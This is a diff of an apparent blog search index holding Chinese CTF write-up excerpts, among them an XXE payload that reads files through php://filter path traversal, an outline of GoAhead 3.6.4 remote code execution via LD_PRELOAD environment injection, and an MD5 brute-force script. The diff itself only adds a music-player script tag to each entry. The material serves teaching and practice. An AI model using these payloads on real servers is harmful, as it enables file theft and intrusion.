@@ -3,7 +3,7 @@
   <entry>
     <title>2019NJUPT_CTF_WP</title>
     <url>/2019/11/2019NJUPT-CTF-WP/</url>
-    <content><![CDATA[<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
 
@@ -33,7 +33,7 @@
   <entry>
     <title>2019红帽杯复现</title>
     <url>/2019/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -45,7 +45,7 @@
   <entry>
     <title>湖湘杯2019复现</title>
     <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
 
 
 
@@ -85,7 +85,7 @@
   <entry>
     <title>Md5Crack</title>
     <url>/2019/11/Md5Crack/</url>
-    <content><![CDATA[<h2 id="简单碰撞脚本"><a href="#简单碰撞脚本" class="headerlink" title="简单碰撞脚本"></a>简单碰撞脚本</h2><p>一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简单碰撞脚本"><a href="#简单碰撞脚本" class="headerlink" title="简单碰撞脚本"></a>简单碰撞脚本</h2><p>一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
 <p>二:</p>
@@ -104,7 +104,7 @@
   <entry>
     <title>wireshark</title>
     <url>/2019/11/wireshark/</url>
-    <content><![CDATA[<h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><p>Ctrl+M 标记/取消标记<br> shift+ctrl+N/B 下/上一个被标记的数据包</p><h2 id="二、过滤器语法"><a href="#二、过滤器语法" class="headerlink" title="二、过滤器语法"></a>二、过滤器语法</h2><h3 id="1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法"><a href="#1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法" class="headerlink" title="1.捕获过滤器的BPF(Berkeley Packet Filter)语法"></a>1.捕获过滤器的BPF(Berkeley Packet Filter)语法</h3><p>限定词    说明                                                                  例子  </p><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h2><p>Ctrl+M 标记/取消标记<br> shift+ctrl+N/B 下/上一个被标记的数据包</p><h2 id="二、过滤器语法"><a href="#二、过滤器语法" class="headerlink" title="二、过滤器语法"></a>二、过滤器语法</h2><h3 id="1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法"><a href="#1-捕获过滤器的BPF-Berkeley-Packet-Filter-语法" class="headerlink" title="1.捕获过滤器的BPF(Berkeley Packet Filter)语法"></a>1.捕获过滤器的BPF(Berkeley Packet Filter)语法</h3><p>限定词    说明                                                                  例子  </p><a id="more"></a>
 
 <p>Type      指出名字或数字所代表的意义                         host、net、port  </p>
 <p>Dir         指明传输方向是前往还是来自名字或数字      src、dst  </p>
@@ -212,7 +212,7 @@
   <entry>
     <title>php弱类型</title>
     <url>/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h2><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。而弱类型语言，不会检查变量类型，可以随时的转换变量类型。</p><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h2><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。而弱类型语言，不会检查变量类型，可以随时的转换变量类型。</p><a id="more"></a>
 <p>在php中</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//随意转换变量类型</span></span><br></pre></td></tr></table></figure>
 
@@ -255,7 +255,7 @@
   <entry>
     <title>bypass_disable_functions</title>
     <url>/2019/10/bypass-disable-functions/</url>
-    <content><![CDATA[<h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="绕过-amp-获取shell"><a href="#绕过-amp-获取shell" class="headerlink" title="绕过&amp;获取shell"></a>绕过&amp;获取shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>根据代码要求：</p><ol>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="绕过-amp-获取shell"><a href="#绕过-amp-获取shell" class="headerlink" title="绕过&amp;获取shell"></a>绕过&amp;获取shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>根据代码要求：</p><ol>
 <li><p>长度不能大于40</p>
 </li>
 <li><p>不能包含大小写字母，数字</p>
@@ -342,7 +342,7 @@
   <entry>
     <title>第十届极客大挑战Write-up</title>
     <url>/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
-    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p><img src="/2019/10/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="打比赛前先撸一只猫！-猫猫陪我打ctf！"><a href="#打比赛前先撸一只猫！-猫猫陪我打ctf！" class="headerlink" title="打比赛前先撸一只猫！: 猫猫陪我打ctf！"></a>打比赛前先撸一只猫！: 猫猫陪我打ctf！</h2><p>开局一只猫，flag全靠捡 -_-</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p><p>直接F12 查看源码</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p><p>直接提交cat=dog</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure><p><img src="/2019/10/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p><img src="/2019/10/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p><p>确实是白给的shell</p><p><img src="/2019/10/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>
 
 
 
